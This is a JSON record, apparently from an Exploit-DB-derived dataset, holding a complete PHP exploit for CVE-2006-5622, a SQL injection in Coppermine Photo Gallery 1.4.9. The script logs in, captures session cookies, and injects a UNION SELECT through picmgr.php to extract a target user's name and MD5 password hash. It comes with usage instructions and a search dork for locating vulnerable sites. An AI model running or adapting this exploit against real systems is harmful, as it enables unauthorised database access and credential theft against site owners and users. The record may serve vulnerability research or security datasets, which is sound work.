{
  "id": "2660",
  "title": "Coppermine Photo Gallery 1.4.9 - SQL Injection",
  "cve": "CVE-2006-5622",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php\r\n<?php\r\n\r\n /*********************************************************************\r\n * Coppermine Photo Gallery 1.4.9 Remote SQL Injection Vulnerability \r\n * \r\n * Note:\r\n * Requires a valid user account.\r\n *\r\n * Usage: \r\n * php script.php [host] [path] [table prefix] [user id] [username] [password]\r\n *\r\n * Usage Example:\r\n * php script.php domain.com /coppermine/ cpg149_ 1 john secret\r\n *\r\n * Googledork\"\r\n * \"Powered by Coppermine Photo Gallery\"\r\n *\r\n * Credits:\r\n * Disfigure - Vulnerability research and discovery\r\n * Synsta - Exploit scripting\r\n * \r\n * [w4ck1ng] - w4ck1ng.com\r\n *********************************************************************/\r\n\r\nif(!$argv[6]){\r\ndie(\"Usage:\r\nphp $argv[0] [host] [path] [table prefix] [user id] [username] [password]\\n\r\nUsage Example:\r\nphp $argv[0] domain.com /coppermine/ cpg149_ 1 john secret\\n\");\r\n}\r\n\r\nif($argv[6]){\r\n\r\nfunction send($host,$put){\r\nglobal $data;\r\n$conn = fsockopen(gethostbyname($host),\"80\");\r\nif(!$conn) {\r\ndie(\"Connection to $host failed...\");\r\n}else{\r\nfputs($conn,$put);\r\n}\r\nwhile(!feof($conn)) {\r\n$data .=fgets($conn);\r\n}\r\nfclose($conn);\r\nreturn $data;\r\n}\r\n\r\n$host = $argv[1];\r\n$path = $argv[2];\r\n$prefix = $argv[3];\r\n$userid = $argv[4];\r\n$userl = $argv[5];\r\n$passl = $argv[6];\r\n\r\n$post = \"username=\".urlencode($userl).\"&password=\".urlencode($passl).\"&submitted=Login\";\r\n$req  = \"POST \".$path.\"login.php?referer=index.php HTTP/1.1\\r\\n\"; \r\n$req .= \"Referer: http://\".$host.$path.\"login.php?referer=index.php\\r\\n\";\r\n$req .= \"Host: $host\\r\\n\";\r\n$req .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$req .= \"Content-Length: \".strlen($post).\"\\r\\n\";\r\n$req .= \"Connection: Close\\r\\n\";\r\n$req .= \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$req .= $post;\r\nsend(\"$host\",\"$req\");\r\n\r\n/* Borrowed from rgod. */           \r\n$temp = explode(\"Set-Cookie: \",$data);\r\n$temp2 = explode(\" \",$temp[1]);\r\n$cookie = $temp2[0];\r\n$temp2 = explode(\" \",$temp[2]);\r\n$cookie .= \" \".str_replace(\";\",\"\",$temp2[0]);\r\n$cookie = str_replace(\"\\r\",\"\",$cookie);\r\n$cookie = str_replace(\"\\n\",\"\",$cookie);\r\n            \r\n$sql = urlencode(\"123 UNION SELECT user_id,user_group,concat(user_name,char(58,58),user_password) FROM \".$prefix.\"users where user_id = \".$userid.\" --\");\r\n$req =  \"GET \".$path.\"picmgr.php?aid=\".\"$sql HTTP/1.1\\r\\n\";\r\n$req .= \"Host: $host\\r\\n\";\r\n$req .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$req .= \"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\n$req .= \"Connection: Close\\r\\n\\r\\n\";\r\nsend(\"$host\",\"$req\");\r\n\r\n$gdata = explode(\"<option value=\\\"picture_no=1,picture_nm=\",$data);\r\n$ghash = explode(\",action=0\\\">\",$gdata[1]);\r\n$hash = $ghash[0];\r\n$uname = explode(\"'\",$hash);\r\n$uname = explode(\"::\",$uname[1]);\r\n$username = $uname[0];\r\n$fhash = explode(\"::\",$hash);\r\n$fhash = explode(\"',picture_sort=100\",$fhash[1]);\r\n$finalhash = $fhash[0];\r\n\r\nif(strlen($finalhash) != 32){ \r\ndie(\"Exploit failed..\\n\"); \r\n}else{ \r\ndie(\"Username: $username MD5: $finalhash\\n\"); \r\n}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-10-27]",
  "url": "https://www.exploit-db.com/exploits/2660"
}